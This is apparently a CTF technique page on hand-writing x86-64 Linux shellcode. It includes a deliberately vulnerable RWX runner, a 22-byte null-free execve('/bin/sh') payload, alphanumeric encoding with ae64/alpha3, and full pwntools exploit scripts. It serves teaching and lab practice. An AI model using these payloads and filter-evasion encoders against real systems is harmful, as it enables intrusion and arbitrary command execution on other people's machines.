---
title: "Shellcode Crafting - Hand-Written x86-64 Linux Payloads"
category: pwn
subcategory: shellcode
type: technique
tags: [shellcode, execve, null-free, alphanumeric-shellcode, nopsled, syscall, nasm, objdump, pwntools, shellcraft, ae64, alpha3, execstack, nx, mprotect, read, strcpy, printf, scanf, gets]
difficulty: medium
summary: "Build execve('/bin/sh') by hand in 22 bytes, strip forbidden bytes (NUL, newline, space), go printable/alphanumeric, and do it all again with pwntools."
when_to_use:
  - "The challenge reads N bytes into an RWX page and calls it - the shellcode IS the exploit"
  - "Your payload travels through gets/scanf/strcpy so it must avoid 0x00, 0x0a or 0x20"
  - "A length cap (25, 20, even 12 bytes) rules out shellcraft's default output"
  - "An input filter demands isalnum() / isprint() bytes only"
  - "You need a non-execve payload: ORW, dup2+connect-back, or a self-modifying stub"
tools: [pwntools, nasm, objdump, gdb, pwndbg, gef, ae64, alpha3, checksec, strace]
related: [shellcode-ret2shellcode, shellcode-seccomp-orw, shellcode-arm-mips, stack-buffer-overflow-basics, rop-fundamentals, rop-srop, mitigation-modern-playbook]
---

## TL;DR

Shellcode is just a flat blob of machine code that runs with no loader, no relocations and
no libc. On x86-64 Linux you set `rax` to the syscall number, arguments in
`rdi, rsi, rdx, r10, r8, r9`, and execute `syscall`. `execve("/bin/sh", NULL, NULL)` fits in
22 bytes with no NUL bytes if you build the string on the stack with `push`/`pop`.

## Recognise it

- A prompt like `send me your shellcode (max 0x20 bytes)` followed by an immediate crash or shell.
- The binary calls `mmap(..., PROT_READ|PROT_WRITE|PROT_EXEC, ...)` then `((void(*)())p)()`.
- A filter loop over your input: `if (!isalnum(buf[i])) exit(1);` or a `memchr(buf, '\n', n)` check.
- `checksec` shows `NX disabled` / `RWX segments` and you already have control of `rip`.
- Your payload truncates at a fixed offset -> a bad byte landed in the middle of the shellcode.

## Vulnerable source

```c
/* runner.c - the canonical "shellcode jail": RWX page, hard length cap, byte filter */
#include <stdio.h>
#include <string.h>
#include <ctype.h>
#include <unistd.h>
#include <sys/mman.h>

#define MAXLEN 25

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);

    void *page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED) { perror("mmap"); return 1; }

    printf("rwx page @ %p\n", page);
    printf("shellcode (<= %d bytes): ", MAXLEN);
    ssize_t n = read(0, page, MAXLEN);
    if (n <= 0) return 1;

    /* argv[1] == "alnum" turns the printable-only filter on */
    if (argc > 1 && !strcmp(argv[1], "alnum"))
        for (ssize_t i = 0; i < n; i++)
            if (!isalnum(((unsigned char *)page)[i])) {
                puts("non-alphanumeric byte rejected");
                return 1;
            }

    ((void (*)(void))page)();
    return 0;
}
```

```sh
# Build the runner. No hardening needed: the page is RWX on purpose.
gcc -m64 -no-pie -fno-stack-protector -O0 -o runner runner.c

# Assemble a hand-written payload to a raw blob (no ELF headers at all)
nasm -f bin sh.asm -o sh.bin && wc -c sh.bin

# Disassemble a raw blob, then test it without any exploit plumbing
objdump -D -b binary -m i386:x86-64 -M intel sh.bin
./runner < sh.bin
```

## Theory

### The x86-64 Linux syscall ABI

| slot | register | note |
|------|----------|------|
| number | `rax` | `59` = execve, `0` = read, `1` = write, `2` = open, `257` = openat, `60` = exit |
| arg1 | `rdi` | |
| arg2 | `rsi` | |
| arg3 | `rdx` | |
| arg4 | `r10` | **not** `rcx` - the `syscall` instruction clobbers `rcx` with the return address |
| arg5 | `r8` | |
| arg6 | `r9` | |
| return | `rax` | negative errno on failure |

`syscall` also clobbers `r11` (saved `rflags`). Everything else survives. On 32-bit the
convention is `int 0x80` with `eax, ebx, ecx, edx, esi, edi` and a *different* syscall table.

### execve("/bin/sh", NULL, NULL) by hand

```nasm
; sh.asm - 22 bytes, no NUL / newline / space bytes
BITS 64

    xor  esi, esi                   ; 31 f6        rsi = 0 (argv); zero-extends to rsi
    push rsi                        ; 56           NUL terminator for the string
    mov  rdi, 0x68732f2f6e69622f    ; 48 bf 2f62 696e 2f2f 7368   "/bin//sh"
    push rdi                        ; 57           string now lives on the stack
    push rsp                        ; 54
    pop  rdi                        ; 5f           rdi = &"/bin//sh"
    push 59                         ; 6a 3b
    pop  rax                        ; 58           rax = SYS_execve
    cdq                             ; 99           edx = sign(eax) = 0 -> envp = NULL
    syscall                         ; 0f 05
```

Why each choice matters:

- `"/bin//sh"` not `"/bin/sh"`: the kernel ignores the doubled slash, and the extra byte
  makes the string exactly 8 bytes so it fits one `mov rdi, imm64` with no padding NUL.
- `xor esi, esi` (2 bytes) instead of `mov rsi, 0` (`48 c7 c6 00 00 00 00`, full of NULs).
  Writing to a 32-bit register zero-extends into the 64-bit one for free.
- `push 59` / `pop rax` (3 bytes) instead of `mov eax, 59` (`b8 3b 00 00 00`, three NULs).
  `push imm8` is the cheapest way to materialise any constant in `-128..127`.
- `cdq` (1 byte) sign-extends `eax` into `edx`. Because `eax = 59 > 0`, `edx` becomes 0.
  `cqo` does the same for `rax -> rdx:rax`. This is the classic "free zero".
- `push rsp; pop rdi` (2 bytes) instead of `mov rdi, rsp` (3 bytes) - and it stays null-free.

### Forbidden bytes

| byte | where it bites | fix |
|------|----------------|-----|
| `0x00` | `strcpy`, `strlen`, `sprintf`, `%s` | xor/sub to zero, `push imm8`+`pop`, `cdq`/`cqo`, 8/32-bit register forms |
| `0x0a` | `gets`, `fgets`, `scanf("%s")`, line-based protocols | re-pick registers/immediates; `0x0a` shows up in `or`/`add` opcodes and in constants |
| `0x20`, `0x09` | `scanf("%s")`, `strtok` | same |
| `0xff`, `0x80+` | `isascii()` / `isprint()` filters | go printable/alphanumeric (below) |

Generic tricks to dodge a specific constant: `mov eax, K ^ M` then `xor eax, M`;
`push K+1; pop rax; dec eax`; `neg`/`not`; build the value byte-by-byte with `shl`+`or`.

### Printable and alphanumeric shellcode

Only a handful of opcodes are encodable with bytes in `[0-9A-Za-z]`: `0x30-0x35` (`xor`,
the workhorse), `0x38-0x3d` (`cmp`), `0x50-0x5a` (`push`/`pop` for a subset of registers),
`0x40-0x4f` (REX prefixes on x86-64; `inc`/`dec` on x86-32), `0x68`/`0x6a` (`push imm32`/`imm8`),
`0x69`/`0x6b` (`imul`), `0x70-0x7f` (short conditional jumps), `0x61` (`popad`, 32-bit only).

That is not enough to write `execve` directly, so the standard approach is a
**self-modifying decoder stub**:

1. Get a register pointing at the payload (`rax`/`rsi` often already does after `read`, or
   you compute it with a `push rsp; pop rax` dance encoded in printable bytes).
2. The alnum stub XORs each byte of the encoded body with a key, writing the result back
   over itself (`xor [rax+off], cl`) - legal only because the page is RWX.
3. Execution falls through into the freshly decoded real shellcode.

Two well-known encoders do this for you: **alpha3** (`ALPHA3.py`), which needs you to name a
register already pointing at the shellcode, and **ae64**, a Python library that emits pure
`[A-Za-z0-9]` x86-64 shellcode and computes its own base address.

### Size-constrained shellcode

The 22-byte `execve` above already fits a 25-byte cap. To go smaller, exploit the register
state you inherit. After the runner's `read(0, page, 25)` returns, `rax` holds the byte
count, `rdi` is 0 (the fd), `rsi` points at the page, `rdx` is the length. So:

```nasm
; 12-byte execve when rsi already points at your own buffer and rdx is small.
; Layout: [ 6 bytes of code ][ "/bin/sh\0" written by you at a known offset ]
    lea  rdi, [rsi + 12]    ; 48 8d 7e 0c   rdi = &"/bin/sh"
    xor  esi, esi           ; 31 f6         argv = NULL
    cdq                     ; 99            envp = NULL (rax was the read count > 0)
    push 59                 ; 6a 3b
    pop  rax                ; 58
    syscall                 ; 0f 05
    db   "/bin/sh", 0
```

Always dump the registers at the moment your shellcode starts (break on the page address in
gdb, then `info registers`) before assuming anything - the freebies change per binary.

When the cap is brutal (under ~12 bytes), don't write the payload at all - write a
**two-stage stub**: `read(0, page, 0x400)` (`rax=0`, `rdi=0`, `rsi` usually already points at
the page, `rdx=0x400`) overwrites the page with a bigger second stage, and execution simply
continues into the freshly read bytes.

## Attack

1. Determine the constraints: max length, banned bytes, whether `execve` is allowed
   (`seccomp-tools dump ./chal`), and which registers are live on entry.
2. Write the smallest shellcode that satisfies them, in NASM, `-f bin`.
3. Assemble and *inspect the bytes* - `objdump -D -b binary` or pwntools `disasm`.
4. Scan for bad bytes programmatically; never eyeball it.
5. Test locally against the runner (or `pwn.run_shellcode`) before touching the remote.
6. If a filter rejects it, encode: XOR-decoder stub, then alnum/printable via ae64/alpha3.
7. Send, `interactive()`, `cat flag`.

## Exploit

Build, verify, and fire the hand-written payload:

```python
#!/usr/bin/env python3
"""Hand-rolled 22-byte execve('/bin/sh') vs. a 25-byte RWX shellcode jail."""
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = args.LOGLEVEL or "info"

BAD = b"\x00\x0a\x20"
MAXLEN = 25

SRC = """
    xor  esi, esi
    push rsi
    mov  rdi, 0x68732f2f6e69622f
    push rdi
    push rsp
    pop  rdi
    push 59
    pop  rax
    cdq
    syscall
"""


def build():
    sc = asm(SRC)
    log.info("shellcode (%d bytes):\n%s\n%s", len(sc), hexdump(sc), disasm(sc))
    bad = sorted({b for b in sc} & set(BAD))
    if bad:
        log.error("bad bytes present: %s", [hex(b) for b in bad])
    if len(sc) > MAXLEN:
        log.error("too long: %d > %d", len(sc), MAXLEN)
    log.info("shellcraft.sh() would be %d bytes", len(asm(shellcraft.amd64.linux.sh())))
    return sc


def start():
    if args.REMOTE:
        return remote(args.HOST or "127.0.0.1", int(args.PORT or 1337))
    return process(["./runner"])


def main():
    sc = build()
    io = start()
    io.recvuntil(b"shellcode (<= 25 bytes): ")
    io.send(sc)
    io.sendline(b"echo PWNED; cat flag*")
    io.interactive()


if __name__ == "__main__":
    main()
```

Alphanumeric variant - encode with `ae64` when available, otherwise fall back to a
hand-rolled XOR decoder stub whose *stub* is printable:

```python
#!/usr/bin/env python3
"""Printable/alphanumeric shellcode for an isalnum() filtered RWX jail."""
from pwn import *

context.arch = "amd64"
context.os = "linux"

PAYLOAD = ("xor esi, esi; push rsi; mov rdi, 0x68732f2f6e69622f; push rdi; "
           "push rsp; pop rdi; push 59; pop rax; cdq; syscall")

ALNUM = bytes(b for b in range(0x100) if chr(b).isalnum())


def encode_alnum(raw):
    """Return pure [A-Za-z0-9] shellcode, or None if no encoder is installed."""
    try:
        from ae64 import AE64
    except ImportError:
        log.warning("ae64 not installed: pip install ae64  (or use ALPHA3.py)")
        return None
    # ae64 emits a self-locating, self-modifying decoder followed by the encoded body.
    return AE64().encode(raw)


def main():
    enc = encode_alnum(asm(PAYLOAD))
    if enc is None:
        log.info("no encoder; sending the raw payload (unfiltered targets only)")
        enc = asm(PAYLOAD)
    else:
        bad = sorted({b for b in enc} - set(ALNUM))
        if bad:
            log.error("non-alphanumeric bytes: %s", [hex(b) for b in bad[:16]])
        log.success("%d alphanumeric bytes", len(enc))
        log.info("decoder head:\n%s", disasm(enc[:32]))

    if args.REMOTE:
        io = remote(args.HOST or "127.0.0.1", int(args.PORT or 1337))
    else:
        io = process(["./runner", "alnum"])

    io.recvuntil(b"shellcode")
    io.recvuntil(b": ")
    io.send(enc)
    io.interactive()


if __name__ == "__main__":
    main()
```

pwntools reference sheet, as a runnable script:

```python
#!/usr/bin/env python3
"""shellcraft / asm / disasm cookbook - prints every payload this repo tends to need."""
from pwn import *

context.arch = "amd64"
context.os = "linux"


def show(name, src):
    blob = asm(src)
    print("== %s : %d bytes ==\n%s\n%s\n" % (name, len(blob), hexdump(blob), disasm(blob)))
    return blob


def main():
    sc = shellcraft.amd64.linux
    show("sh", sc.sh())
    show("execve", sc.execve("/bin/sh", ["/bin/sh"], 0))
    show("cat flag", sc.cat("/flag"))
    show("exit(0)", sc.exit(0))
    show("echo", sc.echo("hi\n"))
    blob = show("open+read+write",
                sc.open("/flag") + sc.read("rax", "rsp", 0x100) + sc.write(1, "rsp", 0x100))

    # Bad-byte report for an arbitrary blob
    found = sorted({b for b in blob} & set(b"\x00\x0a\x20"))
    print("bad bytes:", [hex(b) for b in found] or "none")

    # Run it locally (needs a shell; skip in CI)
    if args.RUN:
        run_shellcode(asm(sc.sh())).interactive()


if __name__ == "__main__":
    main()
```

## Variants & pitfalls

- **Stack alignment.** `execve` does not care, but if your shellcode *calls* into libc
  (e.g. `system`), `rsp` must be 16-byte aligned or `movaps` inside libc faults.
- **`shellcraft.sh()` is not minimal.** It is ~48 bytes and contains no NULs, but it will
  blow a 25-byte cap. Hand-write when the cap is tight; use shellcraft when it is not.
- **Self-modifying code needs a writable page.** The `.text` of a normal binary is RX; a
  decoder stub only works in an `mmap`ed RWX page or on an `-z execstack` stack.
- **Caches.** On x86 the instruction cache is coherent with stores, so self-modifying code
  Just Works. On ARM/MIPS it does not - see `shellcode-arm-mips`.
- **`scanf("%s")` eats more than newline**: space (0x20), tab (0x09), vertical tab, form
  feed and carriage return all terminate. `scanf("%[^\n]")` only stops at 0x0a.
- **Null byte at the end is free.** `strcpy` copies the terminating NUL for you, so the last
  byte of your shellcode may be 0x00 if you plan for it.
- **32-bit targets** use `int 0x80`, `eax = 11` for execve, args in `ebx, ecx, edx`. The
  classic is 21 bytes: `xor eax,eax; push eax; push 0x68732f2f; push 0x6e69622f; mov ebx,esp; ...`.
- **Do not forget `exit`.** If the payload is ORW or a one-shot write, append
  `exit_group(0)` so the process does not fall off the end of the page into garbage.
- **Encoder register contract.** alpha3/ae64 stubs need a register pointing at (or near) the
  shellcode, and a XOR key byte equal to a plaintext byte reintroduces `0x00` - search for a
  key that keeps every encoded byte inside the allowed set.

## Tools

```sh
# Assemble / disassemble from the shell (pwntools CLI)
pwn asm 'xor esi, esi; push rsi' --context=amd64
pwn disasm '31f65648bf2f62696e2f2f7368' --context=amd64
pwn shellcraft -f asm amd64.linux.sh
pwn shellcraft -f hex amd64.linux.cat /flag

# NASM route
nasm -f bin sh.asm -o sh.bin && xxd -p sh.bin
objdump -D -b binary -m i386:x86-64 -M intel sh.bin

# Syscall tables / runtime observation
ausyscall --dump | head -80          # numbers <-> names on the running kernel
strace -f ./runner < sh.bin

# Encoders
python3 ALPHA3.py x64 ascii mixedcase rax --input=sh.bin
python3 -c 'from ae64 import AE64; open("enc.bin","wb").write(AE64().encode(open("sh.bin","rb").read()))'
```
